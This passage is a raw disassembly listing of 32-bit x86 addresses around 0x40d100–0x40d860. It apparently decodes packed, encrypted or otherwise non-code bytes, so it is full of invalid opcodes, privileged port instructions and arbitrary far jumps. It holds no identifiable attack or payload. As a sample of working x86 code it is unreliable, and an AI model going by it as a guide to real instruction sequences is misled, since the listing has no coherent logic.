  40d113:	jecxz  0x40d09e
  40d115:	dec    ebp
  40d116:	retf   0x821a
  40d119:	fnstcw WORD PTR [edi-0xb]
  40d11c:	xlat   BYTE PTR ds:[ebx]
  40d11d:	xchg   DWORD PTR [edi-0x3f],ecx
  40d120:	lea    esp,[edx-0x8]
  40d123:	repnz mov eax,ds:0x5b17f0cd
  40d129:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d12a:	jne    0x40d133
  40d12c:	add    eax,0xb80fed21
  40d131:	and    si,si
  40d134:	xchg   DWORD PTR [eax+0x19],esp
  40d137:	enter  0x525,0xe7
  40d13b:	xor    DWORD PTR [ebp+0x65],ebx
  40d13e:	out    0x1f,al
  40d140:	inc    edi
  40d141:	dec    ebp
  40d142:	pop    eax
  40d143:	xchg   edx,eax
  40d144:	in     al,dx
  40d145:	adc    al,0xf2
  40d147:	mov    ch,0xdc
  40d149:	jmp    0xbb45:0xb611c867
  40d150:	cmp    al,0x6d
  40d152:	pop    ds
  40d153:	rol    BYTE PTR [ecx+0x3f],cl
  40d156:	les    esi,FWORD PTR [esi]
  40d158:	dec    esp
  40d159:	cmp    bl,dl
  40d15b:	mov    fs,WORD PTR [edi+0x3ba95a9f]
  40d161:	xchg   esp,eax
  40d162:	(bad)  
  40d163:	mov    ecx,0xf9547c22
  40d168:	test   al,0xee
  40d16a:	xor    eax,0xf0325845
  40d16f:	cdq    
  40d170:	xchg   edi,eax
  40d171:	nop
  40d172:	dec    ebx
  40d173:	popf   
  40d174:	lahf   
  40d175:	jmp    0x8a02:0xa9420de1
  40d17c:	sbb    edx,DWORD PTR [edx+0x2ca5e86f]
  40d182:	cmp    eax,0x141b5e91
  40d187:	xchg   ecx,eax
  40d188:	stc    
  40d189:	jb     0x40d10e
  40d18b:	pop    esi
  40d18c:	outs   dx,BYTE PTR ds:[esi]
  40d18d:	repz adc BYTE PTR [edx+0x1cbe46c0],al
  40d194:	sbb    al,0xec
  40d196:	leave  
  40d197:	xor    bl,BYTE PTR [ebx+0x8444447]
  40d19d:	aas    
  40d19e:	push   cs
  40d19f:	sar    BYTE PTR [eax],0xd9
  40d1a2:	adc    al,0x28
  40d1a4:	xchg   ecx,eax
  40d1a5:	cmp    eax,0x951e9b8e
  40d1aa:	(bad)  
  40d1ab:	fs cwde 
  40d1ad:	and    al,0xae
  40d1af:	ja     0x40d1ed
  40d1b1:	or     cl,BYTE PTR [edi]
  40d1b3:	ret    0x9b61
  40d1b6:	js     0x40d17a
  40d1b8:	xor    DWORD PTR ds:0xc7389af0,ebp
  40d1be:	out    0xff,al
  40d1c0:	mov    esi,DWORD PTR [edx+0x69]
  40d1c3:	rcr    DWORD PTR [ecx],cl
  40d1c5:	cmp    edx,esi
  40d1c7:	outs   dx,BYTE PTR ds:[esi]
  40d1c8:	dec    esi
  40d1c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1ca:	test   bh,bh
  40d1cc:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1ce:	cli    
  40d1cf:	fist   WORD PTR [eax]
  40d1d1:	xchg   esi,eax
  40d1d2:	aad    0x26
  40d1d4:	hlt    
  40d1d5:	fadd   DWORD PTR [ebx]
  40d1d7:	mov    esp,es
  40d1d9:	imul   eax,DWORD PTR [ecx+edx*4+0x42],0xffffff91
  40d1de:	ret    0xdf3a
  40d1e1:	add    dl,BYTE PTR [ebx]
  40d1e3:	cmp    al,0x98
  40d1e5:	pushf  
  40d1e6:	test   eax,0x4710b40
  40d1eb:	ss pop eax
  40d1ed:	test   eax,0x8116cd72
  40d1f2:	pop    ss
  40d1f3:	(bad)  
  40d1f4:	jl     0x40d1f0
  40d1f6:	shr    DWORD PTR [ebp+0x6553e6e],1
  40d1fc:	pop    ss
  40d1fd:	call   DWORD PTR [ebx]
  40d1ff:	mov    eax,DWORD PTR [ebx+edx*4]
  40d202:	and    BYTE PTR [edi-0x34],cl
  40d205:	add    ebp,eax
  40d207:	outs   dx,BYTE PTR ds:[esi]
  40d208:	aad    0x66
  40d20a:	push   ds
  40d20b:	call   0x2436:0x503626a3
  40d212:	cmp    BYTE PTR [edi-0x6f],cl
  40d215:	scas   al,BYTE PTR es:[edi]
  40d216:	push   0xd56a6379
  40d21b:	or     eax,0x797a108c
  40d220:	lods   al,BYTE PTR ds:[esi]
  40d221:	mov    esi,0x363cc868
  40d226:	clc    
  40d227:	xchg   esp,eax
  40d228:	push   ss
  40d229:	mov    ch,BYTE PTR [esi-0x6f]
  40d22c:	mov    bl,0x9b
  40d22e:	icebp  
  40d22f:	mov    esp,0xa036b48f
  40d234:	push   es
  40d235:	jbe    0x40d234
  40d237:	xor    cl,BYTE PTR [esi-0x276bc1f2]
  40d23d:	xchg   edx,eax
  40d23e:	(bad)  
  40d240:	inc    eax
  40d241:	xchg   DWORD PTR [eax+0x400e29fd],esp
  40d247:	and    eax,0x55d1b6cc
  40d24c:	and    ecx,DWORD PTR [ebx]
  40d24e:	jo     0x40d226
  40d250:	fs mov edx,0x232c1c02
  40d256:	mov    dh,0x72
  40d258:	dec    edx
  40d259:	jmp    0x3198:0xb50bbf03
  40d260:	push   es
  40d261:	bound  esi,QWORD PTR [ebp+eax*4-0x43]
  40d265:	jne    0x40d287
  40d267:	dec    esp
  40d268:	pop    eax
  40d269:	in     eax,dx
  40d26a:	es mov ecx,0x72647ff2
  40d270:	call   DWORD PTR [ebx+0x1b]
  40d273:	cdq    
  40d274:	mov    esp,0x74c82826
  40d279:	xchg   edi,eax
  40d27a:	inc    eax
  40d27b:	sbb    al,0xec
  40d27d:	xchg   ebx,eax
  40d27e:	cmp    al,0x3c
  40d280:	mov    esp,0x7218181d
  40d285:	push   ebp
  40d286:	shr    esi,0xbb
  40d289:	sub    DWORD PTR [ecx+0x137f7e80],edi
  40d28f:	aam    0x90
  40d291:	test   DWORD PTR [edx-0x1cdec8ff],esi
  40d297:	sbb    al,0x10
  40d299:	and    edi,esi
  40d29b:	dec    esp
  40d29c:	jl     0x40d26a
  40d29e:	dec    ebp
  40d29f:	neg    DWORD PTR [eax]
  40d2a1:	aam    0xd4
  40d2a3:	loopne 0x40d31d
  40d2a5:	hlt    
  40d2a6:	dec    edx
  40d2a7:	mov    edi,0xf1f62929
  40d2ac:	icebp  
  40d2ad:	repz xchg edi,eax
  40d2af:	shl    BYTE PTR [ebx+0x7c],0x28
  40d2b3:	mov    esi,0x825bd726
  40d2b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2b9:	jae    0x40d2fb
  40d2bb:	shl    edx,0x5b
  40d2be:	sti    
  40d2bf:	in     al,dx
  40d2c0:	inc    ebp
  40d2c1:	rol    DWORD PTR [edx+0x44],0xbe
  40d2c5:	jbe    0x40d259
  40d2c7:	lds    esp,FWORD PTR [esi-0x6db43d0b]
  40d2cd:	push   ebp
  40d2ce:	or     BYTE PTR [ecx-0x62cfa106],al
  40d2d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2d5:	xchg   ebp,eax
  40d2d6:	lea    edi,[ebx-0x6c38f1f6]
  40d2dc:	int3   
  40d2dd:	mov    bl,0xe
  40d2df:	cmp    ebp,DWORD PTR [ecx]
  40d2e1:	stos   BYTE PTR es:[edi],al
  40d2e2:	adc    ebx,DWORD PTR [ecx-0x32]
  40d2e5:	mov    dl,0x80
  40d2e7:	sub    dl,BYTE PTR [esi-0x5a74b3dc]
  40d2ed:	mov    dl,0x75
  40d2ef:	test   al,0x53
  40d2f1:	out    dx,eax
  40d2f2:	pop    es
  40d2f3:	pop    esp
  40d2f4:	dec    esp
  40d2f5:	or     al,0x6e
  40d2f7:	in     al,dx
  40d2f8:	sub    al,0xdf
  40d2fa:	push   ds
  40d2fb:	pop    esi
  40d2fc:	jmp    0x7b06fc1d
  40d301:	cmp    al,BYTE PTR [edx+0x69]
  40d304:	add    al,0x5b
  40d306:	push   cs
  40d307:	repnz xchg edx,eax
  40d309:	clc    
  40d30a:	aas    
  40d30b:	into   
  40d30c:	popa   
  40d30d:	or     BYTE PTR [edi],0x99
  40d310:	not    ebp
  40d312:	cmp    esi,DWORD PTR [ebp+0x4b]
  40d315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d316:	frstor [ebp+0x10367643]
  40d31c:	lods   eax,DWORD PTR ds:[esi]
  40d31d:	aaa    
  40d31e:	mov    edx,0x7960427d
  40d323:	inc    edi
  40d324:	push   0xffffffdb
  40d326:	retf   0xdfd5
  40d329:	(bad)  
  40d32a:	icebp  
  40d32b:	(bad)  [eax-0x36]
  40d32e:	in     eax,0x6d
  40d330:	lock push esp
  40d332:	fs mov edx,0x7b56d564
  40d338:	outs   dx,DWORD PTR ds:[esi]
  40d339:	mov    edx,0x338c14a
  40d33e:	push   edx
  40d33f:	xchg   DWORD PTR [ecx],ecx
  40d341:	shl    bh,0x28
  40d344:	sub    edx,DWORD PTR [edi-0x1d7ec08e]
  40d34a:	daa    
  40d34b:	jno    0x40d339
  40d34d:	popf   
  40d34e:	(bad)  
  40d34f:	in     eax,dx
  40d350:	dec    edi
  40d351:	push   esp
  40d352:	or     BYTE PTR [ebp-0x34],ch
  40d355:	xchg   ebx,eax
  40d356:	rcr    DWORD PTR [ebx],cl
  40d358:	jge    0x40d328
  40d35a:	into   
  40d35b:	cwde   
  40d35c:	inc    edx
  40d35d:	ret    
  40d35e:	lea    ecx,[edi]
  40d360:	sub    BYTE PTR [ebx+0x7e],bh
  40d363:	inc    esi
  40d364:	dec    ebx
  40d365:	inc    ecx
  40d366:	sti    
  40d367:	cmp    eax,0xde65cc44
  40d36c:	gs inc esi
  40d36e:	int    0xb5
  40d370:	inc    edx
  40d371:	xor    DWORD PTR [edi+0x37],ebx
  40d374:	out    0xaf,al
  40d376:	sub    DWORD PTR [ebx-0x6e],edi
  40d379:	adc    al,0x3a
  40d37b:	and    BYTE PTR fs:[eax],bl
  40d37e:	pop    ds
  40d37f:	push   0x24
  40d381:	mov    ebp,0xc70046b2
  40d386:	cld    
  40d387:	pusha  
  40d388:	ss xor edi,esp
  40d38b:	inc    eax
  40d38c:	mov    bl,BYTE PTR [ebx]
  40d38e:	sti    
  40d38f:	dec    esi
  40d390:	fldl2e 
  40d392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d393:	or     DWORD PTR [ecx],eax
  40d395:	daa    
  40d396:	popa   
  40d397:	add    edx,DWORD PTR [esi-0x31]
  40d39a:	clts   
  40d39c:	and    eax,esi
  40d39e:	inc    edx
  40d39f:	int    0xa1
  40d3a1:	je     0x40d325
  40d3a3:	push   ds
  40d3a4:	and    bl,BYTE PTR es:[eax-0x44695710]
  40d3ab:	mov    eax,ds:0xc0785ca7
  40d3b0:	mov    eax,0xee2bc324
  40d3b5:	or     eax,0x88374352
  40d3ba:	pop    ecx
  40d3bb:	xchg   ebp,eax
  40d3bc:	push   ecx
  40d3bd:	out    0x75,eax
  40d3bf:	sti    
  40d3c0:	xor    BYTE PTR [ecx],bh
  40d3c2:	add    bh,BYTE PTR [esi]
  40d3c4:	cmp    al,0xaa
  40d3c6:	in     eax,dx
  40d3c7:	aas    
  40d3c8:	pop    ds
  40d3c9:	inc    ebx
  40d3ca:	stc    
  40d3cb:	rol    DWORD PTR [esi-0x5],0x9e
  40d3cf:	push   es
  40d3d0:	push   es
  40d3d1:	cmp    al,0x61
  40d3d3:	pop    ebx
  40d3d4:	inc    ebx
  40d3d5:	dec    ecx
  40d3d6:	scas   al,BYTE PTR es:[edi]
  40d3d7:	mov    al,0xd5
  40d3d9:	retf   0x4edf
  40d3dc:	call   0x68745af8
  40d3e1:	add    eax,edi
  40d3e3:	loopne 0x40d41d
  40d3e5:	lahf   
  40d3e6:	das    
  40d3e7:	sbb    esi,esi
  40d3e9:	in     al,0x42
  40d3eb:	loopne 0x40d45e
  40d3ed:	push   0x4de0a50a
  40d3f2:	je     0x40d399
  40d3f4:	cs addr16 sub esi,edi
  40d3f8:	lea    edx,[ecx-0x2ceb1df5]
  40d3fe:	xchg   ch,ch
  40d400:	cld    
  40d401:	neg    DWORD PTR ds:0xe2381682
  40d407:	push   0x39a441e3
  40d40c:	iret   
  40d40d:	loop   0x40d42f
  40d40f:	std    
  40d410:	push   edi
  40d411:	xchg   ebx,eax
  40d412:	int    0xa
  40d414:	add    DWORD PTR [eax-0x6f],ebp
  40d417:	call   0xf423:0xb992b899
  40d41e:	sar    BYTE PTR [esi-0xb],1
  40d421:	push   0x15
  40d423:	sub    al,0x50
  40d425:	mov    ch,0x2f
  40d427:	popf   
  40d428:	push   es
  40d429:	cli    
  40d42a:	outs   dx,DWORD PTR ds:[esi]
  40d42b:	mov    ebp,0x6efceec5
  40d430:	sub    ebp,DWORD PTR [eax-0x20]
  40d433:	(bad)  
  40d435:	sbb    DWORD PTR [esi+0x10],ebp
  40d438:	dec    ebp
  40d439:	cmp    ch,BYTE PTR [ecx-0x35]
  40d43c:	jne    0x40d3fb
  40d43e:	push   ecx
  40d43f:	aad    0x29
  40d441:	aad    0x1
  40d443:	push   ds
  40d444:	jge    0x40d439
  40d446:	repnz mov ebp,DWORD PTR [edx]
  40d449:	fistp  QWORD PTR [ebx]
  40d44b:	jl     0x40d4ca
  40d44d:	or     bh,bh
  40d44f:	xchg   ebp,eax
  40d450:	mov    esi,DWORD PTR [edx+ebx*8+0x43ec4bf9]
  40d457:	add    bl,BYTE PTR [ebx+0x320a08fc]
  40d45d:	dec    edi
  40d45e:	pop    ds
  40d45f:	add    al,0x7d
  40d461:	and    BYTE PTR [esi],dh
  40d463:	ins    DWORD PTR es:[edi],dx
  40d464:	adc    BYTE PTR [esi-0x2d4fab58],bl
  40d46a:	(bad)  
  40d46c:	outs   dx,DWORD PTR ds:[esi]
  40d46d:	scas   al,BYTE PTR es:[edi]
  40d46e:	jg     0x40d4dd
  40d470:	(bad)  
  40d471:	mov    DWORD PTR [eax],eax
  40d473:	test   al,0x1c
  40d475:	xor    BYTE PTR [edx+0x672ece6],bh
  40d47b:	or     al,0xe5
  40d47d:	ds dec ebx
  40d47f:	add    BYTE PTR ss:[ebx],dh
  40d482:	ins    DWORD PTR es:[edi],dx
  40d483:	fistp  QWORD PTR [ecx+0x5426be63]
  40d489:	cs xchg esi,eax
  40d48b:	daa    
  40d48c:	std    
  40d48d:	jge    0x40d50b
  40d48f:	push   esp
  40d490:	cmp    ecx,esi
  40d492:	iret   
  40d493:	stos   BYTE PTR es:[edi],al
  40d494:	data16 jle 0x40d432
  40d497:	ja     0x40d517
  40d499:	jae    0x40d4bd
  40d49b:	jnp    0x40d441
  40d49d:	dec    ebx
  40d49e:	adc    BYTE PTR [esi],bl
  40d4a0:	bound  eax,QWORD PTR [edx+0x65]
  40d4a3:	sahf   
  40d4a4:	xor    al,0xd7
  40d4a6:	fstp   st(6)
  40d4a8:	xor    al,0xa5
  40d4aa:	sbb    ah,BYTE PTR [esi+0x75]
  40d4ad:	pop    eax
  40d4ae:	sub    eax,eax
  40d4b0:	cs inc esi
  40d4b2:	dec    esp
  40d4b3:	cmp    dl,BYTE PTR [eax]
  40d4b5:	adc    DWORD PTR [ebx+0x1f],esp
  40d4b8:	add    dh,al
  40d4ba:	and    cl,al
  40d4bc:	test   eax,0x7ca46da0
  40d4c1:	mov    bh,0x88
  40d4c3:	cwde   
  40d4c4:	jne    0x40d4b9
  40d4c6:	inc    ebp
  40d4c7:	fxch   st(2)
  40d4c9:	push   edx
  40d4ca:	icebp  
  40d4cb:	mov    bl,0x5f
  40d4cd:	retf   
  40d4ce:	test   DWORD PTR [ecx],edx
  40d4d0:	icebp  
  40d4d1:	add    DWORD PTR [esi+0x79ea68b4],0x72
  40d4d8:	shl    ecx,1
  40d4da:	test   al,0x80
  40d4dc:	fidivr DWORD PTR [esi-0x36]
  40d4df:	jg     0x40d500
  40d4e1:	mov    esi,0x59e47cd0
  40d4e6:	dec    esp
  40d4e7:	push   ss
  40d4e8:	or     esp,DWORD PTR [eax]
  40d4ea:	out    dx,al
  40d4eb:	sub    dl,BYTE PTR [edi-0x5bf9e1ac]
  40d4f1:	fdivr  DWORD PTR [eax-0x41ec8a0c]
  40d4f7:	dec    ebx
  40d4f8:	fst    st(6)
  40d4fa:	retf   0x3a58
  40d4fd:	push   esi
  40d4fe:	dec    edi
  40d4ff:	lods   al,BYTE PTR ds:[esi]
  40d500:	fyl2xp1 
  40d502:	cmp    eax,0x3ddea19f
  40d507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d508:	or     dh,BYTE PTR [eax]
  40d50a:	nop
  40d50b:	pusha  
  40d50c:	xchg   ebp,ebp
  40d50e:	(bad)
  40d511:	pop    ebx
  40d512:	arpl   WORD PTR [edi-0x1bafbf8e],di
  40d518:	loopne 0x40d4d1
  40d51a:	ret    0x4cb6
  40d51d:	cmp    al,cl
  40d51f:	pop    ebp
  40d520:	sbb    esp,DWORD PTR [edi-0x2fc88507]
  40d526:	mov    esi,0x8a573383
  40d52b:	(bad)
  40d52f:	mov    ds,WORD PTR [eax+0x76]
  40d532:	pop    es
  40d533:	scas   al,BYTE PTR es:[edi]
  40d534:	sbb    al,0xf0
  40d536:	int3   
  40d537:	push   ebp
  40d538:	sbb    DWORD PTR [ebp+0x654b289f],eax
  40d53e:	cmp    ah,BYTE PTR [edi+0x6e]
  40d541:	jge    0x40d594
  40d543:	and    eax,0xfa07ef57
  40d548:	xlat   BYTE PTR ds:[ebx]
  40d549:	js     0x40d4ee
  40d54b:	pop    esp
  40d54c:	jnp    0x40d5c8
  40d54e:	out    0x9e,al
  40d550:	sbb    al,0x6e
  40d552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d553:	mov    BYTE PTR [edi],cl
  40d555:	mov    dh,0xa3
  40d557:	dec    esi
  40d558:	mov    eax,0xa4057b65
  40d55d:	lods   eax,DWORD PTR ds:[esi]
  40d55e:	jns    0x40d504
  40d560:	xchg   DWORD PTR [esi],ecx
  40d562:	dec    ebp
  40d563:	cwde   
  40d564:	mov    ch,0x72
  40d566:	adc    dh,BYTE PTR [esi-0xf]
  40d569:	sub    eax,0xdbdb7523
  40d56e:	mov    ecx,ebx
  40d570:	jo     0x40d5d2
  40d572:	mov    bl,0xc0
  40d574:	mov    esp,0xb68bae15
  40d579:	retf   
  40d57a:	mov    al,ds:0x7f9cf169
  40d57f:	mov    edi,0xd10715dd
  40d584:	push   DWORD PTR ds:0xed52df7
  40d58a:	rol    BYTE PTR [edx+0x39ee9f00],0x63
  40d591:	repz test DWORD PTR [edx-0x43e7955a],0x6ca318c
  40d59c:	xlat   BYTE PTR ds:[ebx]
  40d59d:	js     0x40d611
  40d59f:	jne    0x40d574
  40d5a1:	test   eax,0x559151
  40d5a6:	cli    
  40d5a7:	or     eax,DWORD PTR [esi-0x72]
  40d5aa:	sar    edx,1
  40d5ac:	adc    cl,BYTE PTR [eax-0x40]
  40d5af:	sub    ah,BYTE PTR [eax]
  40d5b1:	add    eax,0xb3821798
  40d5b6:	test   DWORD PTR [esi],0x144cb48e
  40d5bc:	(bad)  
  40d5be:	hlt    
  40d5bf:	push   ecx
  40d5c0:	ins    DWORD PTR es:[edi],dx
  40d5c1:	pop    edx
  40d5c2:	outs   dx,BYTE PTR ds:[esi]
  40d5c3:	iret   
  40d5c4:	or     edi,DWORD PTR [ebx-0x73]
  40d5c7:	pop    ds
  40d5c8:	pop    esi
  40d5c9:	mov    dl,0xd7
  40d5cb:	aad    0x37
  40d5cd:	lock fimul DWORD PTR ds:0xa0996a98
  40d5d4:	loopne 0x40d60e
  40d5d6:	push   0xffffffe7
  40d5d8:	add    DWORD PTR [ecx+0x34ef5731],eax
  40d5de:	dec    ecx
  40d5df:	inc    ebx
  40d5e0:	retf   0x3e36
  40d5e3:	in     al,0xd9
  40d5e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5e6:	leave  
  40d5e7:	mov    BYTE PTR [edx],al
  40d5e9:	xchg   ebp,eax
  40d5ea:	jp     0x40d5ed
  40d5ec:	jle    0x40d603
  40d5ee:	mov    ecx,0xc97b3f6a
  40d5f3:	into   
  40d5f4:	push   esp
  40d5f5:	mov    al,BYTE PTR [esi]
  40d5f7:	sub    esi,DWORD PTR [ecx]
  40d5f9:	repz je 0x40d600
  40d5fc:	and    al,0xb5
  40d5fe:	adc    bl,BYTE PTR [ecx]
  40d600:	fdiv   QWORD PTR [esi-0x2]
  40d603:	(bad)  
  40d604:	mov    bl,0xf5
  40d606:	stc    
  40d607:	sub    eax,0x1f42d474
  40d60c:	stos   BYTE PTR es:[edi],al
  40d60d:	sub    ecx,DWORD PTR ds:0x79c38a5f
  40d613:	pop    ecx
  40d614:	out    0xc4,al
  40d616:	xchg   ecx,eax
  40d617:	sbb    eax,0x787b5589
  40d61c:	xchg   DWORD PTR [eax+0x5077cb6d],edi
  40d622:	sub    BYTE PTR [di+0x5f7c],bh
  40d627:	cmp    bl,BYTE PTR [ebp+0x56]
  40d62a:	mov    ah,0xfc
  40d62c:	adc    DWORD PTR es:[ebp+edx*2-0x1fe499f7],0x63d3f752
  40d638:	mov    ds:0xa69e57ce,eax
  40d63d:	mov    dl,0x4e
  40d63f:	jmp    0x4:0x3bde4ad6
  40d646:	mov    edi,0x6dcb24e6
  40d64b:	pop    es
  40d64c:	push   cs
  40d64d:	push   eax
  40d64e:	enter  0x5fc7,0x44
  40d652:	into   
  40d653:	mov    ch,0x72
  40d655:	bound  esp,QWORD PTR [ecx+0x56b0c0c2]
  40d65b:	cmp    BYTE PTR [ebp-0x1440554b],ch
  40d661:	addr16 leave 
  40d663:	xor    eax,0x3d2fa801
  40d668:	out    0xf4,eax
  40d66a:	pop    ebx
  40d66b:	call   0x70ec:0x37942804
  40d672:	xchg   edi,eax
  40d673:	je     0x40d6f0
  40d675:	and    bl,ch
  40d677:	mov    ebx,0x66962fe2
  40d67c:	pop    edi
  40d67d:	lods   eax,DWORD PTR ds:[esi]
  40d67e:	jbe    0x40d635
  40d680:	fcom   st(7)
  40d682:	aam    0xb4
  40d684:	test   DWORD PTR [esi-0x5d],ebp
  40d687:	addr16 mov ch,0x5b
  40d68a:	fwait
  40d68b:	push   0x1ce99767
  40d690:	mov    ebp,0xc4013404
  40d695:	jmp    0x40d697
  40d697:	push   cs
  40d698:	adc    DWORD PTR [edi-0x42f3c6e6],esp
  40d69e:	out    dx,eax
  40d69f:	jne    0x40d709
  40d6a1:	jecxz  0x40d6a1
  40d6a3:	addr16 loope 0x40d6ea
  40d6a6:	pop    ss
  40d6a7:	out    0x8d,al
  40d6a9:	div    ebp
  40d6ab:	int3   
  40d6ac:	sub    ecx,0xd129b87e
  40d6b2:	rcr    DWORD PTR [eax-0x23],cl
  40d6b5:	fs mov ebp,0xd335dd77
  40d6bb:	add    dl,BYTE PTR [ebx]
  40d6bd:	pushf  
  40d6be:	mov    WORD PTR [ecx+0x1a],ds
  40d6c1:	stos   BYTE PTR es:[edi],al
  40d6c2:	xor    ecx,DWORD PTR [eax]
  40d6c4:	test   BYTE PTR ds:0xdcb15d72,dh
  40d6ca:	dec    edi
  40d6cb:	push   eax
  40d6cc:	add    DWORD PTR [eax-0x30],esi
  40d6cf:	xor    DWORD PTR [ebx],ecx
  40d6d1:	pop    ebx
  40d6d2:	xchg   edi,eax
  40d6d3:	in     al,dx
  40d6d4:	mov    al,ds:0xf74d40aa
  40d6d9:	stc    
  40d6da:	daa    
  40d6db:	push   esi
  40d6dc:	cwde   
  40d6dd:	test   esp,eax
  40d6df:	or     DWORD PTR [esi],ecx
  40d6e1:	int    0x28
  40d6e3:	stos   DWORD PTR es:[edi],eax
  40d6e4:	sbb    al,BYTE PTR [edx-0x2c]
  40d6e7:	outs   dx,BYTE PTR ds:[esi]
  40d6e8:	pop    edi
  40d6e9:	xchg   BYTE PTR [ebx+0x8],dh
  40d6ec:	mov    bl,ch
  40d6ee:	mov    bl,cl
  40d6f0:	jcxz   0x40d6d5
  40d6f3:	push   edi
  40d6f4:	push   ecx
  40d6f5:	enter  0x19ec,0xc6
  40d6f9:	sbb    al,0x5
  40d6fb:	cld    
  40d6fc:	lods   eax,DWORD PTR ds:[esi]
  40d6fd:	cdq    
  40d6fe:	test   eax,0x85d10557
  40d703:	jmp    0xf697:0xf3b1faf3
  40d70a:	bound  ebp,QWORD PTR [edi]
  40d70c:	cmp    al,0xe7
  40d70e:	(bad)  
  40d70f:	icebp  
  40d710:	dec    eax
  40d711:	out    dx,eax
  40d712:	clc    
  40d713:	push   es
  40d714:	and    esp,DWORD PTR [ecx-0x16]
  40d717:	xchg   DWORD PTR [esi+0x21],ecx
  40d71a:	mov    eax,ds:0xfe906308
  40d71f:	xlat   BYTE PTR ds:[ebx]
  40d720:	stc    
  40d721:	mov    edx,0xc29cf942
  40d726:	mov    eax,ds:0xa981e2b
  40d72b:	je     0x40d70c
  40d72d:	adc    ebp,ebx
  40d72f:	sar    BYTE PTR [edx],0x5f
  40d732:	jo     0x40d6ca
  40d734:	push   ecx
  40d735:	xchg   esi,eax
  40d736:	js     0x40d775
  40d738:	cmp    al,0x1f
  40d73a:	out    dx,eax
  40d73b:	inc    ecx
  40d73c:	stos   DWORD PTR es:[edi],eax
  40d73d:	test   ebx,0x987a2056
  40d743:	stos   BYTE PTR es:[edi],al
  40d744:	mov    es,WORD PTR [edx+0x21]
  40d747:	cli    
  40d748:	inc    ecx
  40d749:	aam    0x36
  40d74b:	fstp   TBYTE PTR gs:[edx+0x2bb4e7b9]
  40d752:	(bad)  
  40d753:	fist   DWORD PTR [ecx]
  40d755:	sti    
  40d756:	out    dx,eax
  40d757:	xchg   ebx,eax
  40d758:	push   ss
  40d759:	push   edi
  40d75a:	sub    bl,cl
  40d75c:	pop    ss
  40d75d:	inc    esp
  40d75e:	btr    DWORD PTR [esp+eiz*2+0x14d8b58f],esp
  40d766:	xor    BYTE PTR fs:[edi],0x25
  40d76a:	gs mov dl,0x6c
  40d76d:	sub    ecx,DWORD PTR [ecx]
  40d76f:	lods   al,BYTE PTR ds:[esi]
  40d770:	mov    ds:0x5029f51d,al
  40d775:	mov    al,BYTE PTR [ebx]
  40d777:	mov    al,ds:0x14d668ce
  40d77c:	xor    eax,0x1b4bd008
  40d781:	adc    al,0xbd
  40d783:	popa   
  40d784:	pushf  
  40d785:	pushf  
  40d786:	rcl    ebp,1
  40d788:	xlat   BYTE PTR ds:[ebx]
  40d789:	jge    0x40d71e
  40d78b:	adc    dh,0x8d
  40d78e:	test   BYTE PTR [ebp-0x54],ch
  40d791:	add    eax,0x793dae50
  40d796:	sbb    al,0x84
  40d798:	cmp    eax,0x66cc9e3f
  40d79d:	xor    bh,BYTE PTR [ebp+0x31]
  40d7a0:	pop    es
  40d7a1:	adc    ch,BYTE PTR [eax+0x3e67801f]
  40d7a7:	mov    edi,0xe528f050
  40d7ac:	mov    al,ds:0x10348412
  40d7b1:	push   ebx
  40d7b2:	mov    ecx,0x4d1e8d68
  40d7b7:	mov    ds:0x65aa41ff,eax
  40d7bc:	mov    esi,0x6d94580d
  40d7c1:	fnstsw WORD PTR [ecx-0xf]
  40d7c4:	adc    ch,cl
  40d7c6:	into   
  40d7c7:	in     eax,dx
  40d7c8:	sbb    eax,0xe48b409f
  40d7cd:	jge    0x40d77b
  40d7cf:	sub    al,0x3b
  40d7d1:	adc    edi,DWORD PTR [ebx]
  40d7d3:	cld    
  40d7d4:	in     eax,dx
  40d7d5:	jge    0x40d768
  40d7d7:	sub    al,0xe8
  40d7d9:	enter  0x4322,0xab
  40d7dd:	mov    gs,WORD PTR [ebx-0x568f9054]
  40d7e3:	pop    ss
  40d7e4:	push   esp
  40d7e5:	ins    DWORD PTR es:[edi],dx
  40d7e6:	(bad)  
  40d7e7:	in     eax,dx
  40d7e8:	jne    0x40d784
  40d7ea:	scas   eax,DWORD PTR es:[edi]
  40d7eb:	in     eax,dx
  40d7ec:	adc    eax,0x2cad4cae
  40d7f1:	inc    esp
  40d7f2:	sub    eax,0x57606a2
  40d7f7:	or     ecx,DWORD PTR [esi]
  40d7f9:	pop    ecx
  40d7fa:	mov    al,0x9
  40d7fc:	mov    ds:0x2cde97fd,eax
  40d801:	push   0x25
  40d803:	and    ebx,DWORD PTR [esi+0x63]
  40d806:	or     esi,DWORD PTR [eax+0x6d292e8a]
  40d80c:	cmp    ch,cl
  40d80e:	je     0x40d85d
  40d810:	cdq    
  40d811:	xor    ebx,DWORD PTR [eax+edx*8+0x51]
  40d815:	out    dx,eax
  40d816:	jge    0x40d87e
  40d818:	push   esp
  40d819:	cmp    BYTE PTR [edx+esi*1],ch
  40d81c:	cs jge 0x40d7b8
  40d81f:	and    esi,DWORD PTR [ebx+ebp*2-0x6f]
  40d823:	lods   eax,DWORD PTR ds:[esi]
  40d824:	in     al,0x9f
  40d826:	test   eax,0xcf6272af
  40d82b:	iret   
  40d82c:	ins    BYTE PTR es:[edi],dx
  40d82d:	outs   dx,DWORD PTR ds:[esi]
  40d82e:	add    al,0x5e
  40d830:	sbb    al,0xc
  40d832:	push   ebp
  40d833:	adc    al,0x7a
  40d835:	pushf  
  40d836:	jb     0x40d87e
  40d838:	cmp    edx,edx
  40d83a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d83b:	das    
  40d83c:	repnz pop edi
  40d83e:	fistp  DWORD PTR [esi-0x6c18a012]
  40d844:	push   edi
  40d845:	lock add BYTE PTR es:[edx+0x1c047e81],bh
  40d84d:	lea    eax,[ebp+0x51]
  40d850:	inc    esi
  40d851:	test   al,0xb5
  40d853:	inc    ebx
  40d854:	or     cl,BYTE PTR [ebp+0x4b]
  40d857:	loope  0x40d7f2
  40d859:	jecxz  0x40d841
